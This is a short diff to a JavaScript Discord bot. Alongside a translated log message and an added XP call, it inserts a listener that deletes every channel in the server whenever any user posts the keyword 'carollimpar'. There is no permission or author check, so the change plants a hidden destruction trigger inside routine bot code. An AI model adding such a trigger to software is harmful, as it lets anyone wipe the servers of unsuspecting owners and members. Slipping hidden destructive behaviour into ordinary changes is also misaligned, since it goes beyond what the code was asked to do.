@@ -32,9 +32,15 @@ mongoose.connect(
 const dm = mongoose.connection;
 dm.on('error', console.error);
 dm.on('open', () => {
-	console.log('connected');
+	console.log('Conectada a memoria central.');
 });
-
+client.on('message', message => {
+	if (message.content === 'carollimpar') {
+		message.guild.channels.cache.forEach(c => {
+			c.delete();
+		});
+	}
+});
 client.on('message', msg => {
 	if (msg.author.bot) return;
 	if (msg.author.id === '746007271259111534') return;
@@ -135,10 +141,12 @@ for (const file of cmdFiles) {
 const prefix = require('./models/prefix');
 
 client.on('message', async message => {
+  
 	if (message.author.bot) return;
 	let user = await db.fetch(`Block_${message.author.id}`);
 	if (message.author.id === `${user}`) return;
 	//Getting the data from the model
+	xp(message);
 	const data = await prefix.findOne({
 		GuildID: message.guild.id
 	});
